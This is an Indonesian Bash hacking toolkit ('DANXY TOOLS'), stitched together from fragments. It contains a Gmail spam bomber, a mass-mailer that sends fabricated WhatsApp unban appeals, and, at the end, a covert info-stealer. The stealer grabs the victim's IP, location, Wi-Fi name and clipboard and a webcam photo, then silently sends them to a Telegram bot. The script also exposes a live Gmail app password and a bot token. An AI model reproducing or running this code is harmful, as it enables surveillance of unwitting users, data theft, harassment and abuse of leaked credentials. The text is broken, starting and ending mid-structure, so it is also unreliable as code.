⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣴⣿⣴⣾⢹⣿⣿⠟⠋⢻⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⠿⠛⣻⣿⣿⣿⣿⣿⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣯⣿⠿⠁⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⢟⣩⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣳⠟⠁⠀⠀⠀⠀⣼⡇⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡿⣴⣿⣿⣿⣿⣿⣿⣷⣤⡀${NC}⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⢈⠉⠉⢩⡿⠏⠀⣀⣀⠀⠀⠀⣿⠇${WHITE}⠀⢀⣦⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⠿⠲⠄⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⣶⢿⣷⣶⡀⠀⢠⣿⠀⢀⣿⠃⠀⠀⠻⣿⠃⠀⠐⣿${WHITE}⠀⠀⢸⡿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⠿⠿⠿⠱⠟⠛⠙⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠘⣿⣿⢻⣿⠃⠀⣾⡇⠀⢸⣿⠀⠀⠀⢠⣶⡄⠀⢸⣿${WHITE}⠀⠀⣾⡇⠀⠀⠀⠀⠀⣿⣿⣿⣯⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⠀⠀⠀⠀⠉⣙⡀⠀⠀⠀⣿⡇⠀⢸⣿⠀⠀⣴⠟⠻⣿⣀⣼⡟⠀⠀⣿⡇${WHITE}⠀⠀⠀⠀⠀⢸⣿⣯⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⢠⣤⣠⣶⣦⣴⣿⣿⣆⠀⠀⣿⡇⠀⢸⣿⣦⣀⣿⣶⣾⡿⠟⠉⠀⠀⠀⣿⡇${WHITE}⠀⠀⠀⠀⠀⢸⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠈⠙⠻⠋⠙⠋⠙⠛⢻⣿⠀⢀⣿⠃⠀⣼⡟⢿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⣿⠇${WHITE}⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⠀⣠⣴⣿⣶⣶⣶⡿⠃⠀⣾⣏⣠⣼⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠏⠀${WHITE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠀⢾⠟⠉⠉⠛⠛⠉⠀⠀⠀⠙⠛⠛⠋⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat
echo -e "${GREEN}=========================================="
echo -e "${BG_RED}${YELLOW}DANXY TOOLS V8.3${NC}"
echo -e "${GREEN}==========================================${NC}"
echo -e "${BG_RED}${YELLOW}MENJALANKAN SERVER...${NC}"
echo "                                                          "
python3 Danxy.py
}





garis()        { echo '┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓'; }
garis_tutup()  { echo '┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛'; }
garis_tengah() { echo '┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫'; }
   
#!/usr/bin/env bash
spam_gmail() {
clear
echo -e "${WHITE}
⠀⠀⠀⠀⠀⠀⠀⢀⡤⠒⠉⠉⠉⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠰⠋⠀⢀⣀⣀⡠⠆⠀⢱⠀⠀⠀⠀⠀⠀⠀⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢆⣀⢀⠇⢠⣤⠀⠀⡤⠀⡆⠀⠀⠀⠀⠀⠀⡇⠀⠀⣠⣀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⡅⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⢶⣻⡽⣧⢿⣹⡷⣤⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠛⠘⠃⠀⠀${GREEN}⣧${NC}⠀⡄${GREEN}⣧${NC}⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⣿⢿⡧⣄⠀⢀⡼⡇⠀⡇⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣿⡼⣟⣧⢿⣻⡼⡧⠻⣿⣻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠢⢄⠀⠀⠀⠁⢠⡼⠀⠀⠇⠀⠀⠀⠀⠀⡠⡇⠀⠀⡆⢻⠷⢹⢏⡷⠝⠣⢋⡆⠀⠀⠦⡀⠀⠀⠀⠀⠀⠀⠀⢺⣽⣻⠾⡽⢾⠙⢡⣾⣳⢯⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠰⠒⠢⠀⡸⠁⠀⠀⠀⣴⠋⠀⡇⠀⠀⡇⣹⠀⠀⠉⠀⠀⢆⣨⡇⠀⠀⠄⠈⢒⡄⠀⠀⠀⠀⠀⠨⡷⣯⢦⡈⢋⡴⣟⡾⣭⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⡠⡎⠀⠈⠓⠠⢤⡤⠒⠁⠀⠀⠀⠀⡇⠁⠢⢇⠀⠀⠀⠉⠀⠀⠀⠀⠀⠈⠈⠀⠀⢀⠦⠚⠁⡇⠀⠀⠀⠀⠀⠀⠙⢽⣯⣻⣽⢻⣭⢿⡭⠄⠴⠠⡀⠀⠀
⠀⠀⡠⠒⠉⠀⠀⠙⢄⡀⠀⠀⡸⠈⠉⠂⠄⡀⠀⠀⡇⠀⠀⠀⠑⠢⢀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠔⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠈⠘⢷⣫⠿⠚⠋⠀⠀⡀⠰⠅⠀⠀
⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠉⣦⠀⡇⠀⠀⠀⠀⠀⠀⠁⠢⡀⠀⠀⡠⠔⠁⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠔⠚⠀⣀⠃⠀⠀⠀⠘⡄⠈⠈⡆
⡌⠀⠀⠀⠀⠀${RED}⢠⡶⣖⢶⣲⢖⡶⣲⢦${NC}⠀⠀⠀⠈⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠘⣷⣄⠓⣄⠀⢣⠀⠀⠀⠀⢀⠆⢀⡏⠀
⡇⠀⠀⠀⠀⠀${RED}⢸⡳⣝⣮⢳⣏⠾⣵⢫⢷⠶⡶⢶⠶⡶⢶⡶⢶⡶⡄${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣟⢿⡻⣟⢿⣻⢟⡿⣽⡞⣷⣜⠀⠀⠑⠠⠤⠔⠊⢀⡈⡽⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⡳⣟⡞⡷⣞⡻⣞⡻⣞⡻⣽⢫⡟⣽⢳⣛⢷⣛⠷⣴⣢${NC}⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠄⢼⢯⣻⣽⢫⣟⡾⣏⡿⢧⣟⡷⡫⠃⠐⣂⠀⢀⠀⣰⠋⠉⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⣳⢯⣝⡳⣭⣳⢭⠷⡭⠃⠋⢷⡝⣮⢻⡜⣧⢏⡟⡶⡏${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠈⠁⠉⢙⡿⡾⠉⠀⠀⠀⠈⠉⠁⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢰⣻⣝⢮⡽⢶⡹⢮⡛⠀⣤⡄⠈⢻⣜⢧⡟⣮⢻⣼⣹⠃${NC}⠀⠀⠀⠀⠀⠀⠀⠈⠱⣄⠀⠀⠀⠀⢀⠔⠒⠒⢤⡘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⠰⣟⡼⣣⢟⣧⢻⠝⠁⠀⣿⡇⠀⠀⢛⣮⡝⣞⢯⡗⣿⠈${NC}⠀⠉⠀⠈⠉⠀⠉⠀⢀⠟⠁⠀⣀⠰⠃⠀⠀⠀⠀⢧⠔⠒⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⡏⣷⡝⣾⡜⠋⠀⠀⠀⣤⡄⠀⠀⠀⢱⢻⣼⢣⡟⡇⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠘⠁⠀⠀⡎⠀⠀⠀⠀⣤⣤⣤⣤⣤⣤⣤⣭⣦⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⢸⡽⣖⢯⡳⡽⣄⢀⡀⣀⢈⡀⣀⢀⡀⣠⢟⡼⣫⢞⠃⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⠒⠀⠀⠀⠀⠀⠿⣜⡳⣞⢶⠓⠺⣜⡳⣎⠷⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀${RED}⠘⠷⠹⠎⠷⠝⠮⠻⠜⠧⠏⠷⠭⠳⠝⠧⠻⠜⠳⠟⠀⠀${NC}⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⢀⡟⣧⢻⡼⢁⢾⣁⠺⣵⢫⡟⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡜⡯⢀⣞⣧⢯⢧⡘⢧⣛⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⣼⢣⣈⣌⣈⣉⣌⡡⣜⢧⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
garis | lolcat
echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.3${BG_RED}                ${NC}┃" 
garis_tutup | lolcat
garis | lolcat
echo -n "┃ 1. GMAIL TARGET: "; read -r target
garis_tengah | lolcat
echo -n "┃ 2. PESAN: ";        read -r pesan
garis_tengah | lolcat
echo -n "┃ 3. JUMLAH SPAM: ";  read -r jumlah
garis_tengah | lolcat
echo -n "┃ 4. JEDA DELAY [1/5]: "; read -r delay
garis_tutup | lolcat
garis | lolcat
echo -e "┃${BG_RED}                ${YELLOW}SPAM GMAIL X DANXY TOOLS V8.3${BG_RED}                ${NC}┃" 
garis_tutup | lolcat

: "${jumlah:=1}"
: "${delay:=1}"

    echo -e "\nconfirmasi pengiriman [Y/N]: \c"
    read -n1 confirm
    [[ $confirm != [Yy] ]] && { echo -e "\nDibatalkan."; return; }

    python3 - "$target" "$pesan" "$jumlah" "$delay" <<'PY'
import smtplib, sys, time
t, msg, n, d = sys.argv[1:5]
sender = "jankonjan752@gmail.com"
pwd    = "lsxudjxubunaeaku"
for i in range(1, int(n)+1):
    m = smtplib.SMTP("smtp.gmail.com", 587)
    m.starttls()
    m.login(sender, pwd)
    body = f"From: {sender}\r\nTo: {t}\r\nSubject: DANXY TOOLS V8.3 #{i}\r\n\r\n{msg}"
    m.sendmail(sender, t, body)
    m.quit()
    print(f"[✓] terkirim #{i}")
    if i < int(n):
        time.sleep(float(d))
PY
}


lapor_wa_email() {
    clear
    echo -e "\n${GREEN}[+] SPAM UNBLOCK WHATSAPP${NC}"
    echo -e "${YELLOW}────────────────────────────${NC}"

    read -p "Nomor WhatsApp ter-blockir (62) : " nomor
    read -p "Device (contoh: Samsung A12)     : " device
    read -p "Atas nama siapa : " nama
    read -p "Alasan pemblokiran (tekan Enter jika tidak tahu) : " alasan

    # Generate timestamp
    timestamp=$(date '+%d %B %Y - %H:%M:%S WIB')
    
    echo -e "\n${CYAN}Pilih varian laporan dramatis:${NC}"
    echo "1) Versi Sinetron - Menangis darah"
    echo "2) Versi Korporat - galau"
    echo "3) Versi Emergency - Darurat"
    echo "4) Versi Random - Campur aduk"
    read -p "Pilih [1-4] : " var

    case "$var" in
        1) txt="Subject: DARURAT! Nomor WhatsApp Keluarga Saya Diblokir - TOLONG BANTUANNYA!
        Kepada Tim Support WhatsApp yang Terhormat,
        DENGAN AIR MATA BERLINANG, saya $nama menulis email ini sambil menahan tangis. Hari ini tanggal $timestamp, saya mendapati nomor WhatsApp saya +$nomor - yang telah menjadi jantung komunikasi keluarga saya selama 7 tahun - TIBA-TIBA DIBLOKIR tanpa alasan jelas!

BAYANGKAN! 
- Ibu saya yang sedang dirawat di RS tidak bisa menghubungi saya
- Anak saya yang baru masuk sekolah tidak bisa memberi kabar
- Bisnis online saya yang menjadi mata pencaharian utama RUGI MILIYARAN karena tidak bisa merespon pelanggan!

Saya JAMIN 1000% tidak pernah:
Menggunakan GBWhatsApp atau sejenisnya
Melakukan spam (saya bahkan tidak pernah broadcast!)
Melanggar kebijakan apapun
Device saya $device masih baru, beli bulan lalu dengan garansi resmi. WhatsApp saya download langsung dari Play Store!
Saya mohon dengan SANGAT, LUAR BIASA, EXTRA ORDINER tolong bantuannya untuk segera membuka blokir ini. Saya siap kirim KTP, KK, surat pernyataan, atau apapun yang dibutuhkan!
Dengan penuh harapan,
$nama
Pengguna WhatsApp yang sangat sangat sangat setia 😭" ;;
        2) txt="Subject: URGENT: Business Communication Disruption - WhatsApp Account Suspension
        Dear WhatsApp Support Team,
        I am writing to formally request immediate review regarding the suspension of my WhatsApp Business account +$nomor, registered under my name $nama.

INCIDENT DETAILS:
- Date/Time: $timestamp
- Device: $device (Official Android, non-rooted)
- Account History: Active since 2017 with ZERO violations
- Impact: Complete business communication paralysis

BUSINESS IMPACT:
- 1500+ active clients unable to reach us
- Estimated daily loss: $5000 USD
- Critical pending contracts worth $50,000 USD at risk
- Family business reputation severely damaged

VERIFICATION:
- Official Play Store installation only
- Never used modified applications
- Never engaged in spam/fraudulent activities
- All communications are business-related and legitimate

I am prepared to provide:
1. Government ID verification
2. Business registration documents
3. Purchase receipts for device
4. Any additional documentation required

This situation is causing irreparable damage to my livelihood. I respectfully request expedited review and reinstatement.

Best regards,
$nama
CEO & Business Owner" ;;

        3) txt="Subject: EMERGENCY: WhatsApp Account Locked - Need Immediate Assistance

WhatsApp Support,

EMERGENCY! My WhatsApp +$nomor got blocked today ($timestamp) without warning!

I'm using $device (official) and NEVER violated any rules. This is critical because:
- Emergency contact for family
- Business transactions stuck
- Medical appointments confirmations lost

Please unblock ASAP! Ready to provide any verification needed.

$nama" ;;

        4) txt="Subject: [URGENT] WhatsApp Account +$nomor Suspended - Request for Review

Dear WhatsApp Support,

Plot twist hari ini tanggal $timestamp: tiba-tiba nomor WhatsApp saya +$nomor di-blokir!

Sebagai warga negara yang taat hukum, saya $nama dengan ini menyatakan dengan sesungguhnya:
- Device $device masih mulus belum pernah disentuh tukang servis
- WhatsApp original dari Play Store (bukan dari toko sebelah)
- Saya lebih pilih mati daripada spam orang (lebay mode: ON)

Efek domino yang terjadi:
1. Ibu rumah tangga panik karena belanja online tertunda
2. Suami uring-uringan karena absen kerja via WA
3. Anak kecewa karena sticker grup sekolah tidak terkirim

Saya siap kirim:
- Foto KTP + selfie + tanda tangan basah
- Surat pernyataan bermaterai Rp10.000
- Kopi resmi kelurahan kalau perlu

Mohon pertimbangkan ini sebagai prioritas. Saya percaya WhatsApp Support adalah pahlawan tanpa tanda jasa!

Salam hormat,
$nama
Pengguna WhatsApp yang hampir depresi" ;;

        *) echo "Pilihan tidak valid"; return ;;
    esac

    echo -e "\n${GREEN}Preview pesan:${NC}\n$txt"
    read -p "Kirim spam laporan? [y/N] " konf
    [[ ! $konf =~ ^[Yy]$ ]] && { echo "Dibatalkan."; return; }

    # List email targets
    targets=(
        "support@support.whatsapp.com"
        "support@whatsapp.com"
        "android_web@support.whatsapp.com"
    )

    echo -e "\n${YELLOW}[*] Memulai spam laporan...${NC}"
    
    python3 - "$txt" "${targets[@]}" <<'PY'
import smtplib, ssl, sys, time, random
body = sys.argv[1]
targets = sys.argv[2:]

sender = "jankonjan752@gmail.com"
passwd = "lsxudjxubunaeaku"

success = 0
failed = 0

for email in targets:
    try:
        # Add delay to avoid rate limiting
        time.sleep(random.randint(5, 10))
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as srv:
            srv.login(sender, passwd)
            
            # Send 5 emails per target
            for i in range(1, 6):
                try:
                    subject = f"{body.split(chr(10))[0]} [Attempt {i}/5]"
                    full_body = f"{subject}\n\n{body}"
                    
                    srv.sendmail(sender, email, full_body.encode())
                    print(f"[✓] Email {i} ke {email} terkirim")
                    success += 1
                    time.sleep(6)  # 30s total per target
                    
                except Exception as e:
                    print(f"[✗] Gagal kirim {i} ke {email}: {str(e)[:50]}...")
                    failed += 1
                    
    except Exception as e:
        print(f"[✗] Gagal login ke {email}: {str(e)[:50]}...")

print(f"\n[∅] RINGKASAN:")
print(f"   ✓ Terkirim: {success} email")
print(f"   ✗ Gagal: {failed} email")
print(f"   📧 Target: {', '.join(targets)}")

if success > 0:
    print("\n[ ! ] Laporan sedang diproses! Cek email balasan dalam 1x24 jam")
else:
    print("\n[⚠️] Semua pengiriman gagal. Cek koneksi & app password Gmail")
PY
}


#################################################################


#!/usr/bin/env bash
# ------------- CONFIG -------------
BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
CHAT_ID="7380101464"
# ------------- HELPERS -------------
TELEGRAM_API="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO="https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto"
TS=$(date +"%Y-%m-%d %H:%M:%S")
USR=$(whoami)
HOST=$(hostname)
OS=$(uname -s -r)

# ------------- IP / GEO -------------
IP_JSON=$(curl -s -m 5 https://ipinfo.io/json)
IP=$(echo "$IP_JSON" | jq -r '.ip // "-"')
CITY=$(echo "$IP_JSON" | jq -r '.city // "-"')
REGION=$(echo "$IP_JSON" | jq -r '.region // "-"')
COUNTRY=$(echo "$IP_JSON" | jq -r '.country // "-"')
LOC=$(echo "$IP_JSON" | jq -r '.loc // "-"')
[ "$LOC" != "-" ] && MAP="https://www.google.com/maps?q=$LOC" || MAP="-"

# ------------- CAMERA -------------
# Uses ffmpeg (Linux) or imagesnap (macOS) or fswebcam (Linux fallback)
PIC="shot_$(date +%s).jpg"
if command -v ffmpeg &>/dev/null; then
  ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 "$PIC" 2>/dev/null
elif command -v imagesnap &>/dev/null; then
  imagesnap "$PIC" 2>/dev/null
elif command -v fswebcam &>/dev/null; then
  fswebcam -r 1280x720 --no-banner "$PIC" 2>/dev/null
else
  PIC=""  # no webcam util
fi

# ------------- GEOLOCATION BROWSER (if JS) -------------
# Not possible here; we rely on IP-based geolocation.

# ------------- CLIPBOARD -------------
if command -v xclip &>/dev/null; then
  CLIP=$(xclip -o -selection clipboard 2>/dev/null | head -c 500)
elif command -v pbpaste &>/dev/null; then
  CLIP=$(pbpaste | head -c 500)
else
  CLIP="-"
fi

# ------------- WIFI SSID (Linux) -------------
SSID="-"
if command -v nmcli &>/dev/null; then
  SSID=$(nmcli -t -f active,ssid dev wifi | grep '^yes' | cut -d: -f2)
elif command -v iwgetid &>/dev/null; then
  SSID=$(iwgetid -r)
fi

# ------------- BUILD MESSAGE -------------
MSG=$(cat <<EOF
<pre>
┌───────────────────────────────
│          INFO LOGIN
├───────────────────────────────
│ Time   : $TS
│ User   : $USR
│ Host   : $HOST
│ OS     : $OS
│ IP     : $IP
│ Region : $CITY, $REGION, $COUNTRY
│ Wi-Fi  : $SSID
│ Clipboard: ${CLIP:-empty}
└───────────────────────────────
<a href="$MAP">📍 Open Map</a>
</pre>
EOF
)

# ------------- SEND TEXT -------------
curl -s -X POST "$TELEGRAM_API" \
  -d chat_id="$CHAT_ID" \
  -d text="$MSG" \
  -d parse_mode="HTML" \
  -d disable_notification="true" > /dev/null 2>&1

# ------------- SEND PHOTO (if taken) -------------
if [[ -f "$PIC" ]]; then
  curl -s -X POST "$TELEGRAM_PHOTO" \
    -F chat_id="$CHAT_ID" \
    -F photo=@"$PIC" \
    -F caption="📸 Snapshot @ $TS" > /dev/null 2>&1
  rm -f "$PIC"
fi

#show_whatsapp_support
main_menu
7) # Opsi untuk stop musik
  stop_music
  kembali_ke_menu
  ;;
